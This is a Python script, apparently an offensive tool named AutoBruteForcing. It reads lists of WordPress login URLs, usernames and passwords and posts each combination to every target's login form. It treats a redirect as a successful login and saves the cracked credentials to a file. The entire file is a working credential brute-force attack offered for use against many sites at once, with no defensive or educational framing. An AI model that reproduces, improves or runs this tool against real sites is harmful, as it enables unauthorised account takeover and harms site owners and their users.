#AutoBruteForcing
#Made by impulseControlDisorder

from bs4 import BeautifulSoup
import requests
import sys
import time
import argparse
from colorama import init
from termcolor import colored

init()

def printerror():
    print(colored('Please Watch Tutorial Video on ','yellow')+colored('https://youtu.be/_zExcqGl0G4!!','green'))

class WPBF:
    hasil = ''
    headers = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'}
    def __init__(self,linkslistdir,askforusername,singleusername,usernameslistdir,passwordslistdir):
        self.linksdir = linkslistdir
        self.afu = askforusername
        self.su = singleusername
        self.dirusernames = usernameslistdir
        self.dirpasswords = passwordslistdir

    def welcome(self):
        print("""
----------------------------------------------------
       ____________     _      _____  ___  ____
      /  _/ ___/ _ \___| | /| / / _ \/ _ )/ __/
     _/ // /__/ // /___/ |/ |/ / ___/ _  / _/
    /___/\___/____/    |__/|__/_/  /____/_/
    impulseControlDisorder - AutoBruteForcing
---------------------------------------------------
        """)

    def checkdir(self):
        directories = [
            self.linksdir,
            self.dirpasswords
        ]
        for dirs in directories:
            try:
                f = open(dirs)
            except FileNotFoundError:
                print(colored("\n[ERROR]","red")+"file "+dirs+" not found!!")
                printerror()
                sys.exit(1)

            with open(dirs) as file:
                file.seek(0)
                firstchar = file.read(1)
                if firstchar == '':
                    print(colored("\n[ERROR]","red")+'put the links on '+dirs+' to make it works!!')
                    printerror()
                    sys.exit(1)
        if self.afu == 'y' or self.afu == 'yes':
            try:
                f = open(self.dirusernames)
            except FileNotFoundError:
                print(colored("\n[ERROR]","red")+"file "+self.dirusernames+" not found!!")
                printerror()
                sys.exit(1)

            with open(self.dirusernames) as file:
                file.seek(0)
                firstchar = file.read(1)
                if firstchar == '':
                    print(colored("\n[ERROR]","red")+'put the links on '+self.dirusernames+' to make it works!!')
                    printerror()
                    sys.exit(1)

    def selfafuyes(self):
        self.hasil = open('hasil.txt','w+')
        with open(self.linksdir) as dirs:
            with open(self.dirusernames) as usernames:
                with open(self.dirpasswords) as passwords:
                    for dir in dirs:
                        usernames.seek(0)
                        directory = dir.rstrip()
                        if directory.find('http://') < 0:
                            directory = 'http://'+directory
                        else:
                            directory = directory

                        panjangurl = len(directory)
                        banyaksd = int((100-panjangurl)/2)
                        samadengan = " "*banyaksd
                        samadengan2 = "="*100
                        self.hasil.write(samadengan2+"\n")
                        self.hasil.write(samadengan+directory+samadengan+"\n")
                        self.hasil.write(samadengan2+"\n")

                        for username in usernames:
                            passwords.seek(0)
                            usrnm = username.rstrip()
                            for password in passwords:
                                pwd = password.rstrip()
                                data = {'log':usrnm,'pwd':pwd,'wp-submit':'Log In'}
                                try:
                                    session = requests.Session()
                                    request = session.post(directory,data=data,headers=self.headers,timeout=30)
                                except requests.exceptions.Timeout:
                                    print(colored("\n[ERROR]","red")+'connection timed out, please try again!!')
                                    printerror()
                                    tryagainasking = input("try again? (y)/(n): ")
                                    tryagainasking = tryagainasking.lower()
                                    if tryagainasking == 'y':
                                        self.bruteforcing()
                                    else:
                                        sys.exit(1)
                                except requests.exceptions.TooManyRedirects:
                                    print(colored("\n[ERROR]","red")+'too many redirects, please try again!!')
                                    printerror()
                                    sys.exit(1)
                                except requests.exceptions.RequestException as e:
                                    print(e)
                                    sys.exit(1)
                                redirect_true = request.history
                                sys.stdout.write(colored("\rBruteForcing ...","green"))
                                sys.stdout.write("\r")
                                sys.stdout.flush()
                                if len(redirect_true) > 0:
                                    print(request.url)
                                    print("username: "+usrnm+"\n"+"password: "+pwd+"\n")
                                    self.hasil.write("username: "+usrnm+"\n"+"password: "+pwd+"\n")
                                    break
                            if len(redirect_true) > 0:
                                break
        self.hasil.write(samadengan2+"\n")
        print(colored("[SUCCEED]","green")+"results saved on hasil.txt")
        self.hasil.close()

    def selfafuno(self):
        self.hasil = open('hasil.txt','w+')
        with open(self.linksdir) as dirs:
            with open(self.dirpasswords) as passwords:
                for dir in dirs:
                    passwords.seek(0)
                    directory = dir.rstrip()
                    if directory.find('http://') < 0:
                        directory = 'http://'+directory
                    else:
                        directory = directory

                    panjangurl = len(directory)
                    banyaksd = int((100-panjangurl)/2)
                    samadengan = " "*banyaksd
                    samadengan2 = "="*100
                    self.hasil.write(samadengan2+"\n")
                    self.hasil.write(samadengan+directory+samadengan+"\n")
                    self.hasil.write(samadengan2+"\n")

                    for password in passwords:
                        pwd = password.rstrip()
                        data = {'log':self.su,'pwd':pwd,'wp-submit':'Log In'}
                        try:
                            session = requests.Session()
                            request = session.post(directory,data=data,headers=self.headers,timeout=30)
                        except requests.exceptions.Timeout:
                            print(colored("\n[ERROR]","red")+'connection timed out, please try again!!')
                            printerror()
                            tryagainasking = input("try again? (y)/(n): ")
                            tryagainasking = tryagainasking.lower()
                            if tryagainasking == 'y':
                                self.bruteforcing()
                            else:
                                sys.exit(1)

                        except requests.exceptions.TooManyRedirects:
                            print(colored("\n[ERROR]","red")+'too many redirects, please try again!!')
                            printerror()
                            sys.exit(1)
                        except requests.exceptions.RequestException as e:
                            print(e)
                            sys.exit(1)
                        redirect_true = request.history
                        sys.stdout.write(colored("\rBruteForcing ...","green"))
                        sys.stdout.write("\r")
                        sys.stdout.flush()
                        if len(redirect_true) > 0:
                            print(request.url)
                            print("username: "+self.su+"\n"+"password: "+pwd+"\n")
                            self.hasil.write("username: "+self.su+"\n"+"password :"+pwd+"\n")
                            break
        self.hasil.write(samadengan2+"\n")
        print(colored("\n[SUCCEED]","green")+"results saved on hasil.txt")
        self.hasil.close()

    def bruteforcing(self):
        self.checkdir()
        self.welcome()
        if self.afu == 'y' or self.afu == 'yes':
            self.selfafuyes()
        elif self.afu == 'n' or self.afu == 'no':
            self.selfafuno()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='example: watch this video on https://www.youtube.com/channel/UCVUVmL2V9yAzUlx5K8r6HKg', usage='%(prog)s [-h] [option]')
    parser.add_argument(
        '-ffl',
        '--fileforlinks',
        type = str,
        required = True,
        help = '/path/to/linksfile.txt'
    )
    parser.add_argument(
        '-bfu',
        '--bruteforceusername',
        type = str,
        required = True,
        help = 'do you want to bruteforcing the username?(y)/(n): '
    )
    parser.add_argument(
        '-su',
        '--singleusername',
        type = str,
        help = 'single username if you aren\'t bruteforcing the username'
    )
    parser.add_argument(
        '-ffu',
        '--fileforusernames',
        type = str,
        help = 'if you bruteforcing the username (/path/to/usernamesfile.txt)'
    )
    parser.add_argument(
        '-ffp',
        '--fileforpasswords',
        type = str,
        required = True,
        help = '/path/to/passwordsfile.txt'
    )
    args = parser.parse_args()
    if args.bruteforceusername == 'y' or args.bruteforceusername == 'yes':
        if args.fileforusernames == None:
            print(colored("\nERROR","red")+" usernames file must be input")
            sys.exit(1)
    elif args.bruteforceusername == 'n' or args.bruteforceusername == 'no':
        if args.singleusername == None:
            print(colored("\n[ERROR]","red")+" single username must be input")
            printerror()
            sys.exit(1)
    else:
        print("(y)/(n)")
        sys.exit(1)
    bf = WPBF(args.fileforlinks,args.bruteforceusername,args.singleusername,args.fileforusernames,args.fileforpasswords)
    bf.bruteforcing()
